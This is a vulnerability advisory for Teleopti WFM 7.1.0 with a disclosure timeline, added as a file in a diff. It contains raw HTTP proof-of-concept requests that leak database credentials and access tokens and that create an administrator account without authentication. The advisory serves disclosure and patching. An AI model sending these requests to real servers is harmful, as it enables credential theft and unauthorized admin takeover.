@@ -1,0 +1,176 @@
+id: 26917
+date: 02/07/2017
+title: Teleopti WFM 7.1.0 Multiple Vulnerabilities
+author: Graph-X
+cves: 
+
+#############################################################
+# Advisory Title: Teleopti WFM (Multiple Vulnerabilities)
+# Date: 2/4/2017
+# Researcher: Graph-X ((email: graphx () sigaint org))
+# Vendor Homepage: http://www.teleopti.com
+# Version: <= 7.1.0
+# CVE: is dead
+#############################################################
+Disclosure Timeline
+############################################################################################
+8/30/2016 - Initial contact made to alert Teleopti of the flaws
+9/2/2016 - Vulnerabilities provided to Teleopti along with POC information
+9/5/2016 - Teleopti Confirms they are able to reproduce and are working on fixes
+9/13/2016 - Teleopti responds confirming patches released
+9/15/2016 - Draft of this advisory is provided to Teleopti for comment and clarification
+9/16/2016 - Teleopti asks that I not disclose
+2/2/2017 - 5 months have passed since initial disclosure. Informed Teleopti of intent to disclose. (No response received).
+2/4/2017 - Public disclosure on twitter and some IRC channels (yeah people still use that shit)
+2/6/2017 - Advisory is published to Full Disclosure and Bug Traq mailing lists.
+
+A Comment On Affected Versions:
+These were mainly found while testing version 7.1.0. Additional research
+showed that some of these vulnerabilities were also present in versions
+back to 6.9. I was unable to confirm directly if versions earlier than
+that are vulnerable, but it is strongly suggested that patch levels be
+brought to current just in case.
+
+##############################{Vulnerabilities}#######################################
+1: Server response contains plaintext username and password
+2: Server response contains password hashes and access tokens
+3: Improper Data Validation allowing Administrator account creation (only version 7.1.0)
+#################################################################################
+
+Background:
+Teleopti is a leading provider of solutions for strategic Workforce
+Management (WFM) and Telecom Expense Management (TEM).
+
+The company is renowned for developing advanced and user-friendly
+solutions based on client requirements. Hundreds of enterprises around the
+world rely on Teleopti to achieve optimal operational efficiency in their
+contact center in order to provide the highest levels of service to their
+users.
+
+
+
+Researcher's Note:
+I want to sincerely thank Teleopti for being so responsive in fixing the
+vulnerabilities reported. This is the FASTEST I have ever received a) a
+response from a vendor regarding security flaws and
+b) the quickest turn around in providing a solution.
+The development team and management of Teleopti have seriously impressed
+me with the lightning fast response to these vulnerabilities. It was an
+absolute pleasure to coordinate with them on providing a better and more
+secure product. Hats off to Teleopti.
+
+
+###Server Response Contains Plaintext Username and Password###
+
+1) Description
+It is possible for a remote authenticated attacker to retrieve the
+database username and password as well as server hostname/IP address via
+the TeleoptiWFM/Administration section. If an authenticated user makes a
+request to the GetOneTenant page and the server will provide a JSON
+response that contains that 'tenant's' database username, password,
+database server name and IP address.
+
+2) Proof of Concept:
+
+1.Send a POST request like the one below:
+POST /TeleoptiWFM/Administration/GetOneTenant HTTP/1.1
+Host: Proof-of-Concept
+Content-Length: 14
+Accept: application/json, text/plain, */*
+Authorization: <Access_Token>
+Content-Type: application/json;charset=UTF-8
+Cookie: <ASP.net session cookie>
+Connection: close
+
+"Teleopti WFM" // This is the default tenant name
+
+2. The server will respond similarly to the below snippet:
+HTTP/1.1 200 OK
+Cache-Control: no-cache
+Pragma: no-cache
+Content-Length: 357
+<snip>
+{"Id":1,"Name":"Teleopti
+WFM","AppDatabase":"TELEOPTIAPPDB","AnalyticsDatabase":"TELEOPTIANALYTICSDB","CommandTimeout":60,"UserName":"DatabaseUser","Password":"hunter2","Server":"SQLSERVER","AggregationDatabase":"","Version":{"HeadVersion":710,"ImportAppVersion":710,"AppVersionOk":true,"Error":null},"Active":true,"UseIntegratedSecurity":false}
+
+3) Remediation
+The vendor has issued a patch to address this information disclosure.
+
+###Server Response Contains Password Hashes and Authorization Tokens###
+1) Description
+A remote authenticated attacker can retrieve the usernames, password
+hashes, and authorization tokens for all the administrative users by
+submitting a GET request to /TeleoptiWFM/Administration/Users. The server
+provides a JSON response that includes excessive information such as user
+password and access token.
+2) Proof of Concept
+A remote authenticated attack would be able to trigger this information
+disclosure by sending a GET request to the server like the one below: GET
+/TeleoptiWFM/Administration/Users HTTP/1.1
+Host: someappserver.example.com
+Accept: application/json, text/plain, */*
+
+
+The response would be similar to the below snippet:
+HTTP/1.1 200 OK
+Cache-Control: no-store, must-revalidate, no-cache, private
+Content-Type: application/json; charset=utf-8
+Connection: close
+
+[{"Id":1,"Name":"Teleopti Tenant
+admin","Email":"example () example com","Password":"******","AccessToken":"********"},{"Id":2,"Name":"joe","Email":"joe
+() example com","Password":"******","AccessToken":"******"}]
+3) Remediation
+Teleopti has issued a patch to remove the password and access token from
+the server response.
+
+
+###Improper Data Validation Allowing Unauthenticated Admin User
+Creation###
+1) Description
+The TeleoptiWFM/Administration page includes several logical checks
+pertaining to initial user setup and first-time-run. One such check is a
+query to see if an admin user has already been established. This check is
+made when first landing on the Administration page. It appears that a
+client-side validation is made using a Boolean response to a GET request
+to the 'HasNoUser' page with either true or false. An unauthenticated
+remote attacker could manipulate the response from false to true which
+would cause the client to reveal an admin user creation form. The form,
+once submitted, makes no additional server side validations there are
+users in the database already. Additionally, an attacker would be able to
+create an admin user simply by sending a POST request similar to the one
+provided below to the 'AddFirstUser' page.
+2) Proof of Concept
+Sending a POST request to the TeleoptiWFM/Administration/AddFirstUser url
+with information provided by a remote unauthenticated attacker will add a
+new user to the Administration user database. The attacker would then be
+able to login with full admin rights to the administration area.
+POST /TeleoptWFM/Administration/AddFirstUser HTTP/1.1
+Host: proofofconcept.com
+Content-Length: 108
+Accept: application/json, text/plain, */*
+Content-Type: application/json;charset=UTF-8
+
+{"Name":"Admin2","Email":"another.admin () example com","Password":"hunter2","ConfirmPassword":"hunter12"}
+
+
+
+If the attacker is successful, the server will provide the following JSON
+response:
+
+HTTP/1.1 200 OK
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 59
+
+{"Success":true,"Message":"Updated the user successfully."}
+3) Remediation
+Teleopti has released a patch to address this flaw. It should be noted
+that the flaw appears to only exist in version 7.1.0 of the TeleoptiWFM
+software.
+
+
+-- 
+Fuck it, let's security! #YOLO
+
+#  0day.today [2023-03-25]  #
